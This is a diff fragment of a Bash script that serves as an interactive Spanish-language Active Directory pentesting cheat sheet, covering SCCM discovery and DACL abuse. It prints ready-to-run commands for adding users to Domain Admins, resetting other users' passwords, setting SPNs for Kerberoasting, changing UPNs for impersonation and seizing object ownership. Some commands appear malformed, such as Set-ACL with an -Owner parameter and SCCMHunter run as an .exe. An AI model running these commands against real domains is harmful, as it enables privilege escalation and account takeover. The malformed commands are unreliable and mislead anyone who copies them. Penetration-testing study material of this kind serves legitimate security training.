+    echo -e "${MAGENTA}Notas:${NC} Los servidores vinculados pueden permitir ejecución de comandos y movimiento lateral entre sistemas."
+    press_enter
+}
+
+sccm_discovery_info() {
+    show_banner
+    echo -e "${GREEN}SCCM Infrastructure Discovery:${NC}"
+    echo
+    show_command "Get-WmiObject -Namespace root\\ccm -Class SMS_Authority" "Descubrir infraestructura SCCM con WMI"
+    show_command "Get-CimInstance -Namespace root\\ccm -ClassName SMS_Authority" "Descubrir con CIM"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar infraestructura de System Center Configuration Manager (SCCM)."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, WMI, CIM."
+    echo -e "${MAGENTA}Notas:${NC} SCCM often tiene privilegios elevados en el dominio y puede ser abused para despliegue de malware o obtención de credenciales."
+    press_enter
+}
+
+sccm_primary_users_info() {
+    show_banner
+    echo -e "${GREEN}SCCM Primary Users:${NC}"
+    echo
+    show_command "Get-WmiObject -Namespace root\\ccm -Class CCM_User" "Enumerar usuarios primarios de SCCM"
+    show_command "Get-CimInstance -Namespace root\\ccm -ClassName CCM_User" "Enumerar con CIM"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar usuarios primarios en SCCM para targeting de ataques."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, WMI, CIM."
+    echo -e "${MAGENTA}Notas:${NC} Los usuarios primarios often tienen privilegios elevados o acceso a sistemas sensibles."
+    press_enter
+}
+
+sccm_hunter_info() {
+    show_banner
+    echo -e "${GREEN}SCCM Hunter:${NC}"
+    echo
+    show_command "SCCMHunter.exe -d $DOMAIN -u $USERNAME -p '$PASSWORD' -f" "Ejecutar SCCMHunter"
+    show_command "Get-SCCMClient -Domain $DOMAIN" "Enumerar clientes SCCM con PowerShell"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar y explotar infraestructura SCCM comprometida."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} SCCMHunter, PowerShell, BloodHound."
+    echo -e "${MAGENTA}Notas:${NC} SCCM often tiene privilegios elevados en el dominio y puede ser abused para despliegue de malware o obtención de credenciales."
+    press_enter
+}
+
+# --- DACL Abuse ---
+dacl_enum_info() {
+    show_banner
+    echo -e "${GREEN}Enumeración de DACLs:${NC}"
+    echo
+    show_command "Get-ACL -Path \"AD:\\CN=Users,DC=$DOMAIN,DC=local\" | Select -ExpandProperty Access" "Enumerar DACLs con PowerShell"
+    show_command "bloodhound-python -d $DOMAIN -u $USERNAME -p '$PASSWORD' -c DCOnly -ns $DC_IP" "Recolectar datos para BloodHound"
+    echo -e "${MAGENTA}Objetivo:${NC} Identificar DACLs vulnerables en objetos de Active Directory."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, BloodHound, ADExplorer."
+    echo -e "${MAGENTA}Notas:${NC} Las DACLs controlan el acceso a objetos de AD. Permisos excesivos often lead to privilege escalation."
+    press_enter
+}
+
+generic_all_write_info() {
+    show_banner
+    echo -e "${GREEN}GenericAll/GenericWrite:${NC}"
+    echo
+    show_command "Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add='host/targetcomputer.$DOMAIN'}" "Añadir SPN con GenericWrite"
+    show_command "Add-ADGroupMember -Identity 'Domain Admins' -Members targetuser" "Añadir usuario a grupo con GenericAll"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar permisos GenericAll o GenericWrite para modificar objetos de AD."
+    echo -e "${MAGENTA}Requisitos:${NC} Permisos GenericAll o GenericWrite sobre un objeto de AD."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, dacledit.py."
+    echo -e "${MAGENTA}Notas:${NC} GenericAll proporciona control total sobre un objeto, mientras que GenericWrite permite modificar la mayoría de los atributos."
+    press_enter
+}
+
+write_property_info() {
+    show_banner
+    echo -e "${GREEN}WriteProperty Attacks:${NC}"
+    echo
+    show_command "Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add='host/targetcomputer.$DOMAIN'}" "Añadir SPN con WriteProperty"
+    show_command "Set-ADUser -Identity targetuser -UserPrincipalName 'newuser@$DOMAIN'" "Modificar UPN con WriteProperty"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar permisos WriteProperty para modificar atributos críticos."
+    echo -e "${MAGENTA}Requisitos:${NC} Permisos WriteProperty sobre atributos específicos como servicePrincipalName o userPrincipalName."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, dacledit.py."
+    echo -e "${MAGENTA}Notas:${NC} WriteProperty sobre atributos como servicePrincipalName puede permitir Kerberoasting attacks, mientras que WriteProperty sobre userPrincipalName puede permitir impersonation."
+    press_enter
+}
+
+reset_password_info() {
+    show_banner
+    echo -e "${GREEN}ResetPassword/ForceChangePassword:${NC}"
+    echo
+    show_command "Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 'NewPassword123!' -Force)" "Resetear contraseña"
+    show_command "Set-ADUser -Identity targetuser -ChangePasswordAtLogon \$true" "Forzar cambio de contraseña"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar permisos ResetPassword o ForceChangePassword para tomar control de cuentas."
+    echo -e "${MAGENTA}Requisitos:${NC} Permisos ResetPassword o ForceChangePassword sobre una cuenta de usuario."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, dacledit.py."
+    echo -e "${MAGENTA}Notas:${NC} ResetPassword permite cambiar la contraseña de un usuario sin conocer la contraseña actual, mientras que ForceChangePassword fuerza al usuario a cambiar su contraseña en el próximo inicio de sesión."
+    press_enter
+}
+
+add_member_info() {
+    show_banner
+    echo -e "${GREEN}AddMember Attacks:${NC}"
+    echo
+    show_command "Add-ADGroupMember -Identity 'Domain Admins' -Members targetuser" "Añadir usuario a grupo con AddMember"
+    show_command "Add-ADPrincipalGroupMembership -Identity targetuser -MemberOf 'Domain Admins'" "Añadir usuario a grupo alternativo"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar permisos AddMember para añadir usuarios a grupos privilegiados."
+    echo -e "${MAGENTA}Requisitos:${NC} Permisos AddMember sobre un grupo de AD."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, dacledit.py."
+    echo -e "${MAGENTA}Notas:${NC} AddMember permite añadir miembros a un grupo, lo que puede ser used para escalar privilegios si el grupo es privilegiado."
+    press_enter
+}
+
+write_owner_info() {
+    show_banner
+    echo -e "${GREEN}WriteOwner Attacks:${NC}"
+    echo
+    show_command "Set-ADObject -Identity targetobject -Owner targetuser" "Cambiar propietario con WriteOwner"
+    show_command "Get-ACL -Path \"AD:\\CN=targetobject,CN=Users,DC=$DOMAIN,DC=local\" | Set-ACL -Owner targetuser" "Cambiar propietario alternativo"
+    echo -e "${MAGENTA}Objetivo:${NC} Explotar permisos WriteOwner para tomar ownership de objetos de AD."
+    echo -e "${MAGENTA}Requisitos:${NC} Permisos WriteOwner sobre un objeto de AD."
+    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, dacledit.py."
+    echo -e "${MAGENTA}Notas:${NC} WriteOwner permite cambiar el propietario de un objeto, lo que generalmente otorga control total sobre el objeto."
+    press_enter
+}
+
+# ==============================================
 # INICIO DE LA APLICACIÓN
 # ==============================================
 
-echo -e "${GREEN}Iniciando Guía Completa de Pentesting de Active Directory...${NC}"
-sleep 2
+echo -e "${GREEN}Iniciando Guía Completa Expandida de Pentesting de Active Directory...${NC}"
+echo -e "${YELLOW}Ahora incluye: AD CS Attacks, Shadow Credentials, NoPac, Kerberos Delegation, MSSQL/SCCM, DACL Abuse${NC}"
+sleep 3
 main_menu
